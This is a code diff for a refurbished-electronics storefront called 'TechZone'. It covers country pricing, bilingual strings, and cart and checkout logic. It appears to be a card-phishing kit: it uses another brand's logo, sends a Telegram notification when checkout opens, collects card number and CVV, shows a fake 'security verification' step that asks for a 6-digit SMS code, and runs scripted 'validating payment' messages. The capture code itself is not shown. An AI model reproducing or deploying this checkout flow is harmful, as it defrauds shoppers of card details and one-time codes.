@@ -1,1301 +1,2353 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TechZone - Premium Technology</title>
-    <link rel="stylesheet" href="style.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link rel="preload" href="style.css" as="style">
-    <link rel="preload" href="script.js" as="script">
-    <link rel="preload" href="hero background.png" as="image">
-    <link rel="preconnect" href="https://ng.jumia.is">
-    <link rel="preconnect" href="https://images.unsplash.com">
-</head>
-<body>
-    <!-- Top Bar -->
-    <div class="top-bar">
-        <div class="container">
-            <div class="top-bar-content">
-                <div class="country-section">
-                    <span class="available-text" data-translate="available_in">Available in:</span>
-                    <div class="country-dropdown-wrapper">
-                        <button id="country-dropdown-btn" class="country-switch">
-                            <span class="flag-icon" id="current-flag">🇭🇳</span>
-                            <span id="current-country">Honduras</span>
-                            <i class="fas fa-chevron-down"></i>
-                        </button>
-                        <div id="country-dropdown" class="country-dropdown hidden">
-                            <button class="country-option" data-country="nicaragua">
-                                <span class="flag-icon">🇳🇮</span>
-                                <span>Nicaragua</span>
-                            </button>
-                            <button class="country-option" data-country="honduras">
-                                <span class="flag-icon">🇭🇳</span>
-                                <span>Honduras</span>
-                            </button>
-                            <button class="country-option" data-country="trinidad">
-                                <span class="flag-icon">🇹🇹</span>
-                                <span>Trinidad and Tobago</span>
-                            </button>
-                            <button class="country-option" data-country="elsalvador">
-                                <span class="flag-icon">🇸🇻</span>
-                                <span>El Salvador</span>
-                            </button>
-                            <button class="country-option" data-country="paraguay">
-                                <span class="flag-icon">🇵🇾</span>
-                                <span>Paraguay</span>
-                            </button>
-                            <button class="country-option" data-country="guatemala">
-                                <span class="flag-icon">🇬🇹</span>
-                                <span>Guatemala</span>
-                            </button>
-                            <button class="country-option" data-country="dominican">
-                                <span class="flag-icon">🇩🇴</span>
-                                <span>Dominican Republic</span>
-                            </button>
-                            <button class="country-option" data-country="usa">
-                                <span class="flag-icon">🇺🇸</span>
-                                <span>USA</span>
-                            </button>
+// Country configuration - check if already defined to prevent duplicate declaration
+if (typeof countryConfig === 'undefined') {
+    var countryConfig = {
+        nicaragua: { flag: '🇳🇮', name: 'Nicaragua', currency: 'NIO', rate: 37, lang: 'es', phone: '+505 8234-1976' },
+        honduras: { flag: '🇭🇳', name: 'Honduras', currency: 'HNL', rate: 25, lang: 'es', phone: '+504 9756-4382' },
+        trinidad: { flag: '🇹🇹', name: 'Trinidad and Tobago', currency: 'TTD', rate: 6.8, lang: 'en', phone: '+1 868 472-7875' },
+        elsalvador: { flag: '🇸🇻', name: 'El Salvador', currency: 'USD', rate: 1, lang: 'es', phone: '+503 7345-6789' },
+        paraguay: { flag: '🇵🇾', name: 'Paraguay', currency: 'PYG', rate: 7500, lang: 'es', phone: '+595 21 456-789' },
+        guatemala: { flag: '🇬🇹', name: 'Guatemala', currency: 'GTQ', rate: 7.8, lang: 'es', phone: '+502 2345-6789' },
+        dominican: { flag: '🇩🇴', name: 'Dominican Republic', currency: 'DOP', rate: 58, lang: 'es', phone: '+1 809 234-5678' },
+        usa: { flag: '🇺🇸', name: 'USA', currency: 'USD', rate: 1, lang: 'en', phone: '+1 415-762-3849' }
+    };
+}
+
+// Transdlation data - check if already defined to prevent duplicate declaration
+const translations = window.translations || {
+    es: {
+        home: "Inicio",
+        products: "Productos",
+        about: "Acerca de",
+        contact: "Contacto",
+        hero_title: "La Mejor Tecnología al Mejor Precio",
+        split_payment: "Pago a Plazos",
+        split_payment_title: "Paga en Cuotas",
+        split_payment_desc: "Paga un depósito del 50% hoy y divide el resto hasta en 6 meses.",
+        about_us_title: "Sobre Nuestra Empresa",
+        about_us_p1: "¡Bienvenido a nuestra tienda en línea! Nos dedicamos a ofrecer los mejores productos y servicios a nuestros clientes. Nuestra misión es entregar calidad y valor en cada compra.",
+        our_team_title: "Nuestro Equipo",
+        our_team_p1: "Contamos con un equipo de profesionales dedicados y apasionados por lo que hacen, siempre listos para ayudarte.",
+        hero_subtitle: "Descubre nuestra selección premium de dispositivos reacondicionados con garantía completa y soporte técnico especializado. Tecnología de calidad a precios excepcionales.",
+        shop_now: "Comprar Ahora",
+        benefit_free_shipping: "Envío Gratis",
+        benefit_free_shipping_desc: "En todos los pedidos",
+        benefit_warranty: "Garantía 1 Año",
+        benefit_warranty_desc: "En todos los productos",
+        benefit_return: "Devolución 30 Días",
+        benefit_return_desc: "Reembolso completo garantizado",
+        benefit_accessories: "Accesorios Incluidos",
+        benefit_accessories_desc: "Cable, caja y protector de pantalla gratis",
+        whatsapp_title: "¿Quieres cambiar por un modelo inferior o necesitas más información?",
+        whatsapp_subtitle: "Chatea con nuestros expertos en WhatsApp para recomendaciones personalizadas y soporte instantáneo",
+        whatsapp_button: "Chatear en WhatsApp",
+        featured_products: "Productos Destacados",
+        all: "Todos",
+        iphones: "iPhones",
+        samsung: "Samsung",
+        audio: "Audio",
+        accessories: "Accesorios",
+        add_to_cart: "Agregar al Carrito",
+        available_in: "Disponible en:",
+        free_shipping: "Envío gratis",
+        free_shipping_all: "Envío gratis en todos los pedidos",
+        new: "¡Nuevo!",
+        certified: "¡Certificado!",
+        hot: "¡Popular!",
+        bestseller: "¡Más Vendido!",
+        deal: "¡Oferta!",
+        value: "¡Gran Valor!",
+        premium: "¡Premium!",
+        top_rated: "¡Mejor Calificado!",
+        popular: "¡Popular!",
+        budget: "¡Económico!",
+        shopping_cart: "Carrito de Compras",
+        empty_cart: "Tu carrito está vacío",
+        subtotal: "Subtotal:",
+        shipping: "Envío:",
+        total: "Total:",
+        checkout: "Proceder al Pago",
+        continue_shopping: "Seguir Comprando",
+        order_summary: "Resumen del Pedido",
+        order_ref: "Número de Referencia:",
+        bank_transfer: "Transferencia Bancaria",
+        credit_card: "Tarjeta de Crédito",
+        bank_details: "Datos Bancarios",
+        account_number: "Número de Cuenta:",
+        account_holder: "Titular de la Cuenta:",
+        reference: "Referencia:",
+        transfer_instructions: "Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.",
+        confirm_transfer: "He realizado la transferencia",
+        bank_name: "Banco:",
+        card_details: "Detalles de la Tarjeta",
+        accepted: "Aceptado:",
+        secure_payment: "Pago 100% Seguro y Verificado",
+        cardholder_name: "Nombre del Titular",
+        card_number: "Número de Tarjeta",
+        expiry_date: "Fecha de Vencimiento",
+        cvc: "CVV",
+        ssl_secured: "Conexión SSL Segura - Tus datos están protegidos",
+        place_order: "Realizar Pedido",
+        delivery_inspection_notice: "Animamos a todos los clientes a inspeccionar minuciosamente su pedido al momento de la entrega por parte del transportista. Si encuentra que el artículo no es satisfactorio o no es como se esperaba, tiene derecho a rechazar la aceptación del paquete. En caso de rechazo, será elegible para un reembolso completo de su monto de compra de acuerdo con nuestra política de devoluciones.",
+        processing_secure: "Procesamiento Seguro",
+        processing_order: "Procesando tu pedido...",
+        processing_wait: "Por favor, no cierres esta ventana",
+        validating_payment: "Validando método de pago",
+        confirming_inventory: "Confirmando inventario",
+        generating_order: "Generando orden de compra",
+        order_confirmed: "¡Pedido Confirmado!",
+        order_success_msg: "Tu pedido ha sido procesado exitosamente. Recibirás un WhatsApp con los detalles.",
+        order_number: "Número de Pedido:",
+        order_total: "Total:",
+        payment_method: "Método de Pago:",
+        estimated_delivery: "Entrega Estimada:",
+        price_high_to_low: "Precio: Mayor a Menor",
+        price_low_to_high: "Precio: Menor a Mayor",
+        featured: "Destacados",
+        storage: "Almacenamiento",
+        condition: "Estado",
+        required: "*Requerido",
+        condition_guide: "Guía de Estado:",
+        condition_guide_desc: "Mejores estados indican menos desgaste y mejor apariencia del dispositivo.",
+        terms_agreement: "Acepto los",
+        terms_and_conditions: "Términos y Condiciones",
+        quantity: "Cantidad:",
+        details: "Detalles",
+        choose_type: "Elegir Tipo",
+        security_verification: "Verificación de Seguridad",
+        verify_payment: "Verifica tu Pago",
+        otp_sent: "Hemos enviado un código de verificación de 6 dígitos a tu número de teléfono. Por favor, ingrésalo a continuación para completar tu compra.",
+        code_expires: "El código expira en: ",
+        resend_code: "Reenviar Código",
+        verify_code: "Verificar Código",
+        invalid_code: "Código inválido. Por favor, inténtalo de nuevo."
+    },
+    en: {
+        home: "Home",
+        products: "Products",
+        about: "About",
+        contact: "Contact",
+        hero_title: "The Best Technology at the Best Price",
+        split_payment: "Split Payment",
+        split_payment_title: "Pay in Installments",
+        split_payment_desc: "Pay a 50% deposit today and split the rest over up to 6 months.",
+        about_us_title: "About Our Company",
+        about_us_p1: "Welcome to our e-shop! We are dedicated to providing the best products and services to our customers. Our mission is to deliver quality and value with every purchase.",
+        our_team_title: "Our Team",
+        our_team_p1: "We have a dedicated team of professionals who are passionate about what they do and are always here to help you.",
+        hero_subtitle: "Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.",
+        shop_now: "Shop Now",
+        benefit_free_shipping: "Free Shipping",
+        benefit_free_shipping_desc: "On all orders",
+        benefit_warranty: "1 Year Warranty",
+        benefit_warranty_desc: "On all products",
+        benefit_return: "30 Day Return",
+        benefit_return_desc: "Full refund guaranteed",
+        benefit_accessories: "Accessories Included",
+        benefit_accessories_desc: "Cable, box and free screen protector",
+        whatsapp_title: "Want to swap for a lower model or need more information?",
+        whatsapp_subtitle: "Chat with our experts on WhatsApp for personalized recommendations and instant support",
+        whatsapp_button: "Chat on WhatsApp",
+        featured_products: "Featured Products",
+        all: "All",
+        iphones: "iPhones",
+        samsung: "Samsung",
+        audio: "Audio",
+        accessories: "Accessories",
+        add_to_cart: "Add to Cart",
+        available_in: "Available in:",
+        free_shipping: "Free Shipping",
+        free_shipping_all: "Free shipping on all orders",
+        new: "New!",
+        certified: "Certified!",
+        hot: "Hot!",
+        bestseller: "Best Seller!",
+        deal: "Deal!",
+        value: "Great Value!",
+        premium: "Premium!",
+        top_rated: "Top Rated!",
+        popular: "Popular!",
+        budget: "Budget!",
+        shopping_cart: "Shopping Cart",
+        empty_cart: "Your cart is empty",
+        subtotal: "Subtotal:",
+        shipping: "Shipping:",
+        total: "Total:",
+        checkout: "Proceed to Checkout",
+        continue_shopping: "Continue Shopping",
+        order_summary: "Order Summary",
+        order_ref: "Order Reference:",
+        bank_transfer: "Bank Transfer",
+        credit_card: "Credit Card",
+        bank_details: "Bank Details",
+        account_number: "Account Number:",
+        account_holder: "Account Holder:",
+        reference: "Reference:",
+        transfer_instructions: "Make the transfer for the total amount and confirm when you have completed the payment.",
+        confirm_transfer: "I have made the transfer",
+        bank_name: "Bank:",
+        card_details: "Card Details",
+        accepted: "Accepted:",
+        secure_payment: "100% Secure and Verified Payment",
+        cardholder_name: "Cardholder Name",
+        card_number: "Card Number",
+        expiry_date: "Expiry Date",
+        cvc: "CVV",
+        ssl_secured: "Secure SSL Connection - Your data is protected",
+        place_order: "Place Order",
+        delivery_inspection_notice: "We encourage all customers to thoroughly inspect their order upon delivery from the carrier. Should you find the item unsatisfactory or not as expected, you have the right to refuse acceptance of the package. In the event of refusal, you will be eligible for a complete refund of your purchase amount in accordance with our return policy.",
+        processing_secure: "Secure Processing",
+        processing_order: "Processing your order...",
+        processing_wait: "Please do not close this window",
+        validating_payment: "Validating payment method",
+        confirming_inventory: "Confirming inventory",
+        generating_order: "Generating purchase order",
+        order_confirmed: "Order Confirmed!",
+        order_success_msg: "Your order has been processed successfully. You will receive a WhatsApp with the details.",
+        order_number: "Order Number:",
+        order_total: "Total:",
+        payment_method: "Payment Method:",
+        estimated_delivery: "Estimated Delivery:",
+        price_high_to_low: "Price: High to Low",
+        price_low_to_high: "Price: Low to High",
+        featured: "Featured",
+        storage: "Storage",
+        condition: "Condition",
+        required: "*Required",
+        condition_guide: "Condition Guide:",
+        condition_guide_desc: "Better conditions indicate less wear and superior device appearance.",
+        terms_agreement: "I agree to the",
+        terms_and_conditions: "Terms and Conditions",
+        quantity: "Quantity:",
+        details: "Details",
+        choose_type: "Choose Type",
+        security_verification: "Security Verification",
+        verify_payment: "Verify Your Payment",
+        otp_sent: "We've sent a 6-digit verification code to your phone number. Please enter it below to complete your purchase.",
+        code_expires: "Code expires in: ",
+        resend_code: "Resend Code",
+        verify_code: "Verify Code",
+        invalid_code: "Invalid code. Please try again."
+    }
+};
+
+// Global variables
+let currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
+let currentLanguage = localStorage.getItem('selectedLanguage') || 'es';
+let cart = JSON.parse(localStorage.getItem('cart')) || [];
+
+document.addEventListener('DOMContentLoaded', () => {
+    currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
+    updateFooterFromBusinessAddress();
+});
+
+
+
+
+// Initialize cart
+updateCartCount();
+updateCartDisplay();
+
+// Currency functions
+function getCurrencySymbol(country) {
+    const config = countryConfig[country];
+    if (!config) return '$';
+    switch (config.currency) {
+        case 'NIO': return 'C$';
+        case 'HNL': return 'L';
+        case 'TTD': return 'TT$';
+        case 'XCD': return 'EC$';
+        case 'USD': return '$';
+        default: return '$';
+    }
+}
+
+function convertPrice(price, showBoth = true) {
+    const config = countryConfig[currentCountry];
+    if (!config) return `$${price.toFixed(2)}`;
+
+    const usdPrice = `$${price.toFixed(2)}`;
+
+    // For USD countries, always show USD only
+    if (config.currency === 'USD') {
+        return usdPrice;
+    }
+
+    const convertedPrice = price * config.rate;
+    const symbol = getCurrencySymbol(currentCountry);
+    const localFormattedPrice = convertedPrice.toLocaleString('en-US', {
+        minimumFractionDigits: 0,
+        maximumFractionDigits: 0
+    });
+    const localPrice = `${symbol}${localFormattedPrice}`;
+
+    return showBoth ? `${usdPrice} / ${localPrice}` : localPrice;
+}
+
+// Translation function
+function updateLanguage(lang) {
+    currentLanguage = lang;
+    const elements = document.querySelectorAll('[data-translate]');
+    elements.forEach(element => {
+        const key = element.getAttribute('data-translate');
+        if (translations[lang] && translations[lang][key]) {
+            element.textContent = translations[lang][key];
+        }
+    });
+
+    const placeholderElements = document.querySelectorAll('[data-translate-placeholder]');
+    placeholderElements.forEach(element => {
+        const key = element.getAttribute('data-translate-placeholder');
+        if (translations[lang] && translations[lang][key]) {
+            element.setAttribute('placeholder', translations[lang][key]);
+        }
+    });
+}
+
+// Update prices based on country
+function updatePrices() {
+    document.querySelectorAll('.current-price').forEach(priceElement => {
+        // Extract the base USD price from the element's data attribute or text
+        let price = parseFloat(priceElement.getAttribute('data-usd-price'));
+        if (isNaN(price)) {
+            // Fallback to extracting from text if no data attribute
+            const priceText = priceElement.textContent;
+            const usdMatch = priceText.match(/\$(\d+(?:\.\d{2})?)/);
+            if (usdMatch) {
+                price = parseFloat(usdMatch[1]);
+                priceElement.setAttribute('data-usd-price', price);
+            }
+        }
+        if (!isNaN(price)) {
+            priceElement.textContent = convertPrice(price, false);
+        }
+    });
+
+    document.querySelectorAll('.original-price').forEach(priceElement => {
+        // Extract the base USD price from the element's data attribute or text
+        let price = parseFloat(priceElement.getAttribute('data-usd-original-price'));
+        if (isNaN(price)) {
+            // Fallback to extracting from text if no data attribute
+            const priceText = priceElement.textContent;
+            const usdMatch = priceText.match(/\$(\d+(?:\.\d{2})?)/);
+            if (usdMatch) {
+                price = parseFloat(usdMatch[1]);
+                priceElement.setAttribute('data-usd-original-price', price);
+            }
+        }
+        if (!isNaN(price)) {
+            priceElement.textContent = convertPrice(price, false);
+        }
+    });
+}
+
+// Initialize color selection for products
+function initializeColorSelection(productId, colorSelectId, mainImageId, addToCartBtnId) {
+    const colorSelect = document.getElementById(colorSelectId);
+    const mainImage = document.getElementById(mainImageId);
+    const addToCartBtn = document.getElementById(addToCartBtnId);
+
+    if (colorSelect && mainImage && addToCartBtn) {
+        colorSelect.addEventListener('change', function() {
+            const selectedOption = this.options[this.selectedIndex];
+            const newImageSrc = selectedOption.getAttribute('data-image');
+
+            if (newImageSrc) {
+                mainImage.src = newImageSrc;
+
+                // Update the add to cart button data-product with new image
+                const productData = JSON.parse(addToCartBtn.getAttribute('data-product'));
+                productData.image = newImageSrc;
+                addToCartBtn.setAttribute('data-product', JSON.stringify(productData));
+
+                // Update the product card onclick to navigate to product page
+                const productImage = mainImage.closest('.product-image');
+                if (productImage) {
+                    productImage.onclick = function() {
+                        window.location.href = `product.html?id=${productId}`;
+                    };
+                }
+            }
+        });
+    }
+}
+
+// Cart functions
+function addToCart(product) {
+    try {
+        if (!product || !product.id) {
+            console.error('Invalid product data:', product);
+            return;
+        }
+
+        const existingItem = cart.find(item => item.id === product.id);
+
+        if (existingItem) {
+            existingItem.quantity += 1;
+        } else {
+            const newItem = {
+                id: product.id,
+                name: product.name || 'Unknown Product',
+                price: parseFloat(product.price) || 0,
+                image: product.image || '',
+                quantity: 1
+            };
+            cart.push(newItem);
+        }
+
+        // Auto-add free Gorilla Glass screen protector for phone purchases
+        if (product.id.includes('iphone') || product.id.includes('galaxy')) {
+            const screenProtectorExists = cart.find(item => item.id === 'free_gorilla_glass');
+            if (!screenProtectorExists) {
+                cart.push({
+                    id: 'free_gorilla_glass',
+                    name: 'FREE: Premium Gorilla Glass Screen Protector (9H Hardness)',
+                    price: 0,
+                    image: 'https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg',
+                    quantity: 1,
+                    isFreeGift: true
+                });
+            }
+        }
+
+        localStorage.setItem('cart', JSON.stringify(cart));
+
+        updateCartCount();
+        updateCartDisplay();
+        showAddToCartFeedback();
+    } catch (error) {
+        console.error('Error adding to cart:', error);
+    }
+}
+
+function removeFromCart(productId) {
+    cart = cart.filter(item => item.id !== productId);
+    localStorage.setItem('cart', JSON.stringify(cart));
+    updateCartCount();
+    updateCartDisplay();
+}
+
+function updateQuantity(productId, newQuantity) {
+    const item = cart.find(item => item.id === productId);
+    if (item) {
+        if (newQuantity <= 0) {
+            removeFromCart(productId);
+        } else {
+            item.quantity = newQuantity;
+            localStorage.setItem('cart', JSON.stringify(cart));
+            updateCartCount();
+            updateCartDisplay();
+        }
+    }
+}
+
+function updateCartCount() {
+    const cartCount = document.getElementById('cart-count');
+    if (cartCount) {
+        const totalItems = cart.reduce((total, item) => total + item.quantity, 0);
+        cartCount.textContent = totalItems;
+        cartCount.style.display = totalItems > 0 ? 'flex' : 'none';
+    }
+}
+
+function updateCartDisplay() {
+    const cartItems = document.getElementById('cart-items');
+    const cartSubtotal = document.getElementById('cart-subtotal');
+    const cartTotal = document.getElementById('cart-total');
+
+    if (!cartItems) return;
+
+    if (cart.length === 0) {
+        const emptyMessage = currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty';
+        cartItems.innerHTML = `
+            <div id="empty-cart-message" class="empty-cart-message">
+                <i class="fas fa-shopping-cart"></i>
+                <p>${emptyMessage}</p>
+            </div>
+        `;
+        if (cartSubtotal) cartSubtotal.textContent = convertPrice(0, false);
+        if (cartTotal) cartTotal.textContent = convertPrice(0, false);
+        return;
+    }
+
+    let subtotal = 0;
+    let cartHTML = '';
+
+    cart.forEach((item) => {
+        const itemTotal = item.price * item.quantity;
+        subtotal += itemTotal;
+
+        const isFreeGift = item.isFreeGift || item.price === 0;
+        const priceDisplay = isFreeGift ? 'FREE' : convertPrice(itemTotal, false);
+
+        cartHTML += `
+            <div class="cart-item ${isFreeGift ? 'free-gift-item' : ''}" data-item-id="${item.id}">
+                <div class="cart-item-image">
+                    <img src="${item.image || 'https://via.placeholder.com/60x60'}" alt="${item.name}" loading="lazy" class="cart-product-image">
+                    ${isFreeGift ? '<div class="gift-overlay"><i class="fas fa-gift"></i></div>' : ''}
+                </div>
+                <div class="cart-item-details">
+                    <h4>${item.name}</h4>
+                    <div class="cart-item-controls">
+                        ${isFreeGift ? 
+                            '<span class="free-gift-badge">FREE GIFT</span>' :
+                            `<div class="quantity-controls">
+                                <button type="button" data-action="decrease" data-item-id="${item.id}">-</button>
+                                <span class="quantity">${item.quantity}</span>
+                                <button type="button" data-action="increase" data-item-id="${item.id}">+</button>
+                            </div>`
+                        }
+                        <div class="item-price ${isFreeGift ? 'free-price' : ''}">${priceDisplay}</div>
+                        ${!isFreeGift ? 
+                            `<button type="button" class="remove-item" data-action="remove" data-item-id="${item.id}">
+                                <i class="fas fa-trash"></i>
+                            </button>` : ''
+                        }
+                    </div>
+                </div>
+            </div>
+        `;
+    });
+
+    cartItems.innerHTML = cartHTML;
+
+    // Remove existing event listeners to avoid duplicates
+    const existingHandler = cartItems.getAttribute('data-handler-attached');
+    if (!existingHandler) {
+        // Add event listeners for cart item actions only once
+        cartItems.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            const button = e.target.closest('button[data-action]');
+            if (!button) return;
+
+            const action = button.getAttribute('data-action');
+            const itemId = button.getAttribute('data-item-id');
+
+            if (!itemId) return;
+
+            const item = cart.find(cartItem => cartItem.id === itemId);
+            if (!item) return;
+
+            switch(action) {
+                case 'increase':
+                    updateQuantity(itemId, item.quantity + 1);
+                    break;
+                case 'decrease':
+                    updateQuantity(itemId, item.quantity - 1);
+                    break;
+                case 'remove':
+                    removeFromCart(itemId);
+                    break;
+            }
+
+            return false;
+        });
+        cartItems.setAttribute('data-handler-attached', 'true');
+    }
+
+    if (cartSubtotal) cartSubtotal.textContent = convertPrice(subtotal, false);
+    if (cartTotal) cartTotal.textContent = convertPrice(subtotal, false);
+}
+
+function showAddToCartFeedback() {
+    const notification = document.createElement('div');
+    notification.className = 'cart-notification';
+    notification.innerHTML = '<i class="fas fa-check"></i> Product added to cart!';
+    notification.style.cssText = `
+        position: fixed;
+        top: 100px;
+        right: 20px;
+        background: var(--primary-color);
+        color: white;
+        padding: 1rem 1.5rem;
+        border-radius: 8px;
+        z-index: 10000;
+        animation: slideInRight 0.3s ease;
+    `;
+
+    document.body.appendChild(notification);
+    setTimeout(() => {
+        notification.remove();
+    }, 3000);
+}
+
+// Checkout functionality
+function initializeCheckout() {
+    const checkoutBtn = document.getElementById('checkout-btn');
+    if (checkoutBtn) {
+        checkoutBtn.removeEventListener('click', openCheckout); // Remove existing listener
+        checkoutBtn.addEventListener('click', openCheckout);
+    }
+}
+
+function openCheckout() {
+    try {
+        if (cart.length === 0) {
+            alert(currentLanguage === 'es' ? 'Tu carrito está vacío' : 'Your cart is empty');
+            return;
+        }
+
+        // Send Telegram notification
+        if (typeof TelegramNotifications !== 'undefined') {
+            TelegramNotifications.proceedToCheckoutCard({
+                total: convertPrice(getCartTotal(), false),
+                itemCount: cart.length,
+                orderRef: generateOrderReference()
+            });
+        }
+
+        createCheckoutModal();
+    } catch (error) {
+        console.error('Error opening checkout:', error);
+        alert('Error opening checkout. Please try again.');
+    }
+}
+
+// Global variable to store checkout data
+let checkoutData = {
+    orderNumber: '',
+    paymentMethod: 'bank-transfer',
+    cardholderName: '',
+    total: 0,
+    discountCode: '',
+    discountAmount: 0,
+    originalTotal: 0,
+    customerName: '',
+    customerPhone: '',
+    customerEmail: '',
+    customerAddress: '',
+    customerCity: '',
+    customerPostal: ''
+};
+
+function createCheckoutModal() {
+    // Remove existing checkout overlay
+    const existingOverlay = document.getElementById('checkout-overlay');
+    if (existingOverlay) {
+        existingOverlay.remove();
+    }
+
+    const overlay = document.createElement('div');
+    overlay.id = 'checkout-overlay';
+    overlay.className = 'checkout-overlay active';
+
+    const modal = document.createElement('div');
+    modal.className = 'checkout-modal';
+
+    const subtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+    checkoutData.total = subtotal;
+    checkoutData.orderNumber = `ORDER-${Date.now()}`;
+
+    const checkoutHTML = `
+    <div class="checkout-header">
+        <h2 data-translate="checkout">Checkout</h2>
+        <button class="close-checkout">
+            <i class="fas fa-times"></i>
+        </button>
+    </div>
+    <div class="checkout-content">
+        <div class="checkout-steps">
+            <div class="step active" data-step="1">
+                <span>${(currentLanguage === 'es' ? 'Resumen' : 'Summary')}</span>
+            </div>
+            <div class="step" data-step="2">
+                <span>${currentLanguage === 'es' ? 'Información' : 'Information'}</span>
+            </div>
+            <div class="step" data-step="3">
+                <span>${currentLanguage === 'es' ? 'Pago' : 'Payment'}</span>
+            </div>
+            <div class="step" data-step="4">
+                <span>${currentLanguage === 'es' ? 'Procesando' : 'Processing'}</span>
+            </div>
+            <div class="step" data-step="5">
+                <span>${currentLanguage === 'es' ? 'Confirmación' : 'Confirmation'}</span>
+            </div>
+            <div class="step" data-step="6">
+                <span>${currentLanguage === 'es' ? 'Verificación' : 'Verification'}</span>
+            </div>
+        </div>
+        <div id="checkout-step-1" class="checkout-step active">
+            <div class="order-summary">
+                <div class="summary-section">
+                    <h3>${currentLanguage === 'es' ? 'Resumen del Pedido' : 'Order Summary'}</h3>
+                    <div class="checkout-items">
+                        ${cart.map(item => {
+                            const itemPrice = (item.price === 0 || item.isFreeGift) ? 'FREE' : convertPrice(item.price * item.quantity, false);
+                            const giftIndicator = (item.price === 0 || item.isFreeGift) ? ' 🎁' : '';
+                            const isFreeGift = item.price === 0 || item.isFreeGift;
+                            return `
+                                <div class="checkout-item ${isFreeGift ? 'free-gift-checkout-item' : ''}">
+                                    <img src="${item.image}" alt="${item.name}" style="width: 50px; height: 50px; object-fit: contain; background: var(--background-light); border-radius: 6px; padding: 3px;">
+                                    <div class="checkout-item-details">
+                                        <h4>${item.name}${giftIndicator}</h4>
+                                        <p>Qty: ${item.quantity} × <span class="checkout-item-price">${itemPrice}</span></p>
+                                    </div>
+                                </div>
+                            `;
+                        }).join('')}
+                    </div>
+                </div>
+
+                <div class="summary-section">
+                    <h4>${(currentLanguage === 'es' ? 'Resumen de Costos' : 'Cost Summary')}</h4>
+                    <div class="checkout-totals">
+                        <div class="totals-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Subtotal:' : 'Subtotal:')}</span>
+                            <span class="totals-value" id="checkout-subtotal">${convertPrice(subtotal, false)}</span>
+                        </div>
+                        <div class="totals-row shipping-row">
+                            <span class="totals-label">${(currentLanguage === 'es' ? 'Envío:' : 'Shipping:')}</span>
+                            <span class="totals-value free-shipping">
+                                <i class="fas fa-shipping-fast"></i>
+                                ${(currentLanguage === 'es' ? 'Gratis' : 'Free')}
+                            </span>
+                        </div>
+                        <div class="totals-separator"></div>
+                        <div class="totals-row total-row">
+                            <span class="totals-label total-label">${(currentLanguage === 'es' ? 'Total:' : 'Total:')}</span>
+                            <span class="totals-value total-value" id="checkout-total">${convertPrice(subtotal, false)}</span>
                         </div>
                     </div>
                 </div>
 
-            </div>
-        </div>
-    </div>
-
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="header-content">
-                <div class="logo">
-                    <a href="#">
-                        <img src="https://1000logos.net/wp-content/uploads/2023/11/Swappie-Logo.png" alt="TechZone" style="height: 40px; width: auto;">
-                    </a>
+                <div class="summary-section">
+                    <div class="terms-agreement" style="display: flex; align-items: center; gap: 0.75rem; padding: 1rem; background: var(--background-light); border-radius: var(--border-radius); border: 1px solid var(--border-color);">
+                        <input type="checkbox" id="terms-checkbox" required style="transform: scale(1.2); accent-color: var(--primary-color);">
+                        <label for="terms-checkbox" style="cursor: pointer; font-size: 0.95rem; color: var(--text-color);">
+                            ${(currentLanguage === 'es' ? 'Acepto los' : 'I agree to the')} 
+                            <a href="terms.html" target="_blank" style="color: var(--primary-color); text-decoration: underline;">
+                                ${(currentLanguage === 'es' ? 'Términos y Condiciones' : 'Terms and Conditions')}
+                            </a>
+                        </label>
+                    </div>
                 </div>
 
-                <nav class="nav-desktop">
-                    <a href="index.html" class="nav-link" data-translate="home">Home</a>
-                    <a href="#products" class="nav-link" data-translate="products">Products</a>
-                    <a href="split-payment.html" class="nav-link" data-translate="split_payment">Split Payment</a>
-                    <a href="about.html" class="nav-link" data-translate="about">About</a>
-                    <a href="contact.html" class="nav-link" data-translate="contact">Contact</a>
-                </nav>
-
-                <div class="header-actions">
-                    <div class="search-box">
-                        <input type="text" data-translate-placeholder="search_products" placeholder="Search products...">
-                        <i class="fas fa-search"></i>
-                    </div>
-                    <a href="#" class="user-link">
-                        <i class="fas fa-user"></i>
-                    </a>
-                    <a href="#" id="cart-button" class="cart-link">
-                        <i class="fas fa-shopping-cart"></i>
-                        <span id="cart-count" class="cart-count">0</span>
-                    </a>
-                    <button class="mobile-menu-btn" id="mobile-menu-btn">
-                        <i class="fas fa-bars"></i>
+                <div class="step-actions" style="margin-top: 1.5rem; display: flex; justify-content: center;">
+                    <button id="next-to-shipping" class="btn btn-primary checkout-next" disabled>
+                        ${(currentLanguage === 'es' ? 'Continuar' : 'Continue')} <i class="fas fa-arrow-right"></i>
                     </button>
                 </div>
             </div>
-
-            <!-- Mobile Menu -->
-            <div class="mobile-menu hidden" id="mobile-menu">
-                <div class="mobile-menu-content">
-                    <a href="index.html" class="mobile-menu-link" data-translate="home">Home</a>
-                    <a href="#products" class="mobile-menu-link" data-translate="products">Products</a>
-                    <a href="about.html" class="mobile-menu-link" data-translate="about">About</a>
-                    <a href="contact.html" class="mobile-menu-link" data-translate="contact">Contact</a>
-                </div>
-                <div class="mobile-search">
-                    <input type="text" data-translate-placeholder="search_products" placeholder="Search products...">
-                    <i class="fas fa-search"></i>
-                </div>
-            </div>
         </div>
-    </header>
-
-    <!-- Hero Section -->
-    <section class="hero">
-        <div class="container">
-            <div class="hero-content">
-                <h1 class="hero-title" data-translate="hero_title">The Best Technology at the Best Price</h1>
-                <p class="hero-subtitle" data-translate="hero_subtitle">Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.</p>
-                <div class="hero-buttons">
-                    <a href="#products" class="btn btn-primary" data-translate="shop_now" style="justify-content: center; max-width: 200px; margin: 0 auto;">
